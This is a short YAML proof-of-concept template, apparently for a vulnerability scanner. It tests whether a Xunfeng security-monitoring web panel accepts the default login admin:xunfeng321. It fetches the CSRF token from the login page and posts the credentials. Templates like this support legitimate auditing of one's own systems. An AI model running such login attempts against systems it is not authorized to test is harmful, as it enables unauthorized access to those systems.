name: poc-yaml-xunfeng-default-password
rules:
  - method: GET
    path: /login
    headers:
      Content-Type: application/x-www-form-urlencoded
    search: |
      <input type="hidden" name="csrf_token" value="(?P<token>.+?)"/>
    expression: |
      response.status == 200 && response.body.bcontains(b"<title>巡风</title>") && response.body.bcontains(b"login")
  - method: POST
    path: /login
    headers:
      Content-Type: application/x-www-form-urlencoded
    follow_redirects: true
    body: |
      csrf_token={{token}}&account=admin&password=xunfeng321
    expression: |
      response.status == 200 && response.body.bcontains(b"loginout")
detail:
  author: tangshoupu
  info: xunfeng-default-password[admin:xunfeng321]
  links:
    - https://github.com/ysrc/xunfeng/blob/master/docs/install/Docker.md
